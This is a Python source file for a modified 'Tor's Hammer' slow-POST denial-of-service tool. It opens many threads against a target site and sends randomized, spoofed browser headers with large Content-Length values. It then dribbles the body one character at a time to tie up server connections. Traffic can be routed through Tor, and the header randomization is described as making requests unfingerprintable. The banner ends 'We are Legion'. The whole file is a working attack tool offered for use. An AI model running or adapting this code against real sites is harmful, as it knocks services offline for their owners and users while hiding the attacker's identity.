#!/usr/bin/python
# -*- coding: utf-8 -*-

from ast import parse
from ctypes.wintypes import ULARGE_INTEGER
from importlib.resources import path
import sys
from threading import Thread
import socks
import http.client
import re
from urllib.parse import urlparse
import ssl
import socket
import argparse
import string
import random
from time import sleep
from colors import Colors


DEBUG    = True
CONTENT_MIN = 800
CONTENT_MAX = 1500
SSL_VERSION = ssl.PROTOCOL_TLS_CLIENT

stop = False


# Constants
USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}

class Connection(object):
    
    def __init__(self, target: string, target_port: int, use_ssl: bool, use_tor: bool, tor_ip: string, tor_port: int, tor_password: string):
        
        self.target = target            # absolute URI (i.e. https://google.com)
        self.target_port = target_port 
        self.use_ssl = use_ssl
        self.use_tor = use_tor
        self.tor_ip = tor_ip
        self.tor_port = tor_port
        self.tor_password = tor_password

        parsed_url = urlparse(self.target)
        self.path = parsed_url.path                 # (i.e. "/", or "/something/more/")
        if self.path == '': self.path = '/'
        self.host = parsed_url.netloc.split(':')[0] # url (i.e. google.com)

        self.target_ip = socket.gethostbyname(self.host)

        # DEBUG INFO
        if DEBUG:
            Colors.debug(f'{type(self).__name__}.__init__', f'Host IP: {self.target_ip}')


class ATACMS(object):


    def __init__(self, c: Connection, threadName:string = ""):

        self.c = c
        self.connected = False
        self.socket = None
        self.client = None
        self.ssl_wrap = None
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

        self.name = f'ATACMS [{threadName}]'
        self.threadName = threadName


    def _connect(self, ) -> bool:

        if self.connected: self._disconnect()

        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

            # c.target is absolute URI (i.e. https://google.com)
            # c.host is URL (i.e. google.com)

            if self.c.use_ssl:

                self.client = self.ctx.wrap_socket(
                    self.socket, 
                    server_hostname=self.c.host
                    )
                self.client.connect(
                    (self.c.host,
                    self.c.target_port)
                    )

            else:
                if self.c.use_tor:
                    self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.c.tor_ip, self.c.tor_port)
                self.socket.connect((self.c.target_ip, self.c.target_port))

            self.connected = True

            # DEBUG INFO
            if DEBUG:
                Colors.debug(f'{type(self).__name__}._connect in {self.threadName}', 'Connected')

        except Exception as e:
            self.connected = False

            # DEBUG INFO
            if DEBUG:
                Colors.debug(f'{type(self).__name__}._connect in {self.threadName}', f'{e}')

        return self.connected


    def _disconnect(self, ):
        
        if self.connected:

            if self.c.use_ssl:
                if self.client is not None:
                    try:
                        self.client.close()
                        self.client = None
                        self.socket = None
                    except:
                            pass # silently ignore

            else:
                if self.socket is not None:
                    try:
                        self.socket.shutdown(socks.socket.SHUT_RDWR)
                        self.socket.close()
                    except:
                        pass # silently ignore

                    self.socket = socks.socksocket()
                
                # DEBUG INFO
                if DEBUG:
                    Colors.debug(f'{type(self).__name__}._disconnect in {self.threadName}', f'Disconnected')
                    
            self.connected = False

    
    def _prepare_http(self, headers: dict, msg: str) -> str:

        http = ''

        if headers is not None:
            http = 'POST / HTTP/1.1\r\n'

            for key in headers:
                http += f'{key}: {headers[key]}\r\n'

            http += '\r\n'

        if msg is not None:
            http += msg 

        return http


    def _send_http(self, msg: str, headers: dict) -> bool:

        if not self.connected:
            self._connect()

        if self.connected:
            try:

                data = self._prepare_http(headers, msg)

                if self.c.use_ssl: self.client.sendall(data.encode('utf-8'))
                else: self.socket.sendall(data.encode('utf-8'))

                # DEBUG INFO
                if DEBUG:
                    Colors.debug(f'{type(self).__name__}.__init__', f'Sent: {msg}')
            
            except Exception as e:
                
                self._disconnect()
                self.connected = False

                # DEBUG INFO
                #if DEBUG:
                #    Colors.debug(f'{type(self).__name__}._send_http in {self.threadName}', f'{e}')

                return False
            return True
        return False


    def _send_header(self, content_length: int) -> bool:
        
        headers = self._create_payload(content_length)
        return self._send_http(None, headers)


    # not used. TOR will change IP every 5-10 mins.    
    def _refresh_tor_ip(self, ) -> bool:


        # # alternative
        # from stem.control import Controller
        # from stem import Signal

        # with Controller.from_port(port = 9151) as controller:
        #     controller.authenticate('hrl_sj0QldH-3jr')  
        #     controller.signal(Signal.NEWNYM) 

        try:
            if random.randint(0, 1000) == 27:
                if self.use_ssl:
                    self.ssl.sendall(f'AUTHENTICATE "{self.tor_password}"\r\nSIGNAL NEWNYM\r\n')
            else:
                self.socket.sendall(f'AUTHENTICATE "{self.tor_password}"\r\nSIGNAL NEWNYM\r\n')
            
            return True

        except:
            return False


    def send(self, ) -> bool:

        global CONTENT_MAX, CONTENT_MIN
        global stop

        content_length = random.randint(CONTENT_MIN, CONTENT_MAX)
        
        if not self.connected and not stop:
            self._connect()

        if self.connected and not stop:
            try:
  
                if not self._send_header(content_length) and not stop: 
                    # DEBUG INFO
                    if DEBUG:
                        Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'Not able to send first message')
                    return False

                for _ in range(content_length):

                    if stop: break

                    if not self._send_http(random.choice(string.ascii_letters), None):
                            
                        # DEBUG INFO
                        if DEBUG:
                            Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'Not able to send message')

                        return False

                    sleep(random.uniform(0.1, 3))

                self._disconnect()
                return True

            except Exception as e:
                self._disconnect()

                # DEBUG INFO
                if DEBUG:
                    Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'{e}')

        return False


    def _create_payload(self, content_length: int) -> "tuple[str, str]":

        headers = self._generate_random_headers(content_length)

        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return random_headers


    def _build_block(self, size) -> string:
        
        msg = ''
        for _ in range(size):
            msg += random.choice(string.ascii_letters + string.digits)

        return msg


    def _generate_query_string(self, ammount = 1) -> str:

        queryString = []

        for i in range(ammount):

            key = self._build_block(random.randint(3,10))
            value = self._build_block(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def _generate_user_agent(self):

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name']) 
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(list(browser['ext_pre'])), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(list(browser['ext_post'])))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(list(os['ext'])))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(list(platform['name'])))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(list(platform['details'])) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(list(platform['extensions'])))

        return ua_string


    def _generate_random_headers(self, content_length:int, ):

        referers = [ 
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://www.yahoo.com/',
            'http://www.globo.com/',
            'http://www.pastebin.com/',
            'https://www.nasa.gov/',
            'https://www.facebook.com/',
            'http://www.chris.com/',
            'http://www.retrojunkie.com/',
            'http://www.usatoday.com/',
            'http://www.engadget.search.aol.com/',
            'http://www.ask.com/',
            'http://www.sogou.com/',
            'http://www.zhongsou.com/',
            'http://www.dmoz.org/',
            'http://' + self.c.target + '/'
            'https://' + self.c.target + '/'
            ]

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self._generate_user_agent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive', #timeout=5, max=1000
            'Keep-Alive': f'timeout={random.randint(1000,2000)}, max={random.randint(700,1000)}',
            'Host': self.c.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self._build_block(random.randint(5,10))

            random_referer = random.choice(referers) + url_part
            
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self._generate_query_string(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        # Content Length
        http_headers['Content-Length'] = content_length

        # Random Content-Trype
        http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self._generate_query_string(random.randint(1, 5))

        return http_headers


class HIMARS(Thread):


    def __init__(self, c: Connection, name: string = ''):

        super(HIMARS, self).__init__()
        self.c = c
        self.name = name
        self.atacms = ATACMS(self.c, self.name)


    def run(self,):

        global stop
        while(not stop):
            self.atacms.send()


def main(argv):

    global stop
   
    parser = argparse.ArgumentParser(description='This script is a modified torshammer script with few additional functionalities taken from blackhorizon.')
    parser.add_argument('-t', '--target', help='Absolute URI of the target.', type=ascii, required=True)
    parser.add_argument('-p', '--port', help='Target\'s port., default=80', type=int, default=80)
    parser.add_argument('-r', '--threads', help='Number of threads', type=int, required=True)

    sub_parsers = parser.add_subparsers(help='TOR options')
    tor_parser = sub_parsers.add_parser('tor', help='Use tor.')
    tor_parser.add_argument('-i', '--tor-ip', help='TOR IP address and port, default=127.0.0.1', default='127.0.0.1', type=ascii)
    tor_parser.add_argument('-o', '--tor-port', help='TOR\'s port, default=9050', default=9050, type=int)
    tor_parser.add_argument('-s', '--tor-password', help='TOR service pasword', type=ascii)

    args = parser.parse_args(argv)

    # check url
    args.target = args.target.replace('\'','')

    urlRegex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    if not re.match(urlRegex, args.target):
        Colors.error('Invalid target url. Please use absolute URI (i.e. https://google.com).')
        sys.exit()
    
    # check other arguments
    args.ssl = args.target.startswith('https') == True

    if args.ssl and args.port != 443:
        Colors.warn('Target is using SSL but port is set to {args.port}.')
        i = input('Set port to 443 [Y/n]? ')
        if i == 'y' or i == 'Y' or i == '':
            args.port = 443

    args.use_tor = False
    args.tor_ip = ''
    args.tor_port = 0
    args.tor_password = ''

    if hasattr(args, 'tor_password') and len(args.tor_password) > 0: 
        if not args.ssl:
            args.use_tor = True
            args.tor_ip  = args.tor_ip.replace('\'','')
            args.tor_password = args.tor_password.replace('\'','')

            Colors.info('TOR will be used. Please make sure that the service is running.')
        
        else:
            Colors.warn('You can use either TOR or SSL but not both.')
            Colors.warn('TOR will NOT be used. Make sure that you use VPN.')

    nthreads = args.threads

    # save arguments
    c = Connection(
        args.target,    # absolute URI
        args.port,      # target port
        args.ssl,       # True or False
        args.use_tor,   # True or False
        args.tor_ip,    # TOR IP
        args.tor_port,  # TOR port
        args.tor_password
    )

    del(args)

    Colors.info(f'Target: {c.target}:{c.target_port}  SSL: {c.use_ssl}  TOR: {c.use_tor}  Threads: {nthreads}')
    Colors.warn('Give 20 seconds without tor or 40 seconds before checking the site.')
    _ = input('Press any key to start.')

    threads = []
    for i in range(nthreads): 
        t = HIMARS(c, f'Thread-{i+1}')
        threads.append(t)
        t.start()

    Colors.info('Processess launched.')

    while len(threads) > 0:
        try:
            threads = [t.join(1) for t in threads if t is not None and t.is_alive()]
        
        except KeyboardInterrupt:
            Colors.info('\nShutting down processes. Please wait until done.\n')
            
            stop = True
            threads = [t.join() for t in threads if t is not None and t.is_alive()]
            Colors.info('Done.')
            sys.exit(0)


if __name__ == "__main__":
    
    Colors.info("Modified Tor's Hammer ")
    Colors.info("Slow POST DoS Testing Tool")
    Colors.info("Anon-ymized via Tor")
    Colors.info("We are Legion.\n")

    main(sys.argv[1:])
    
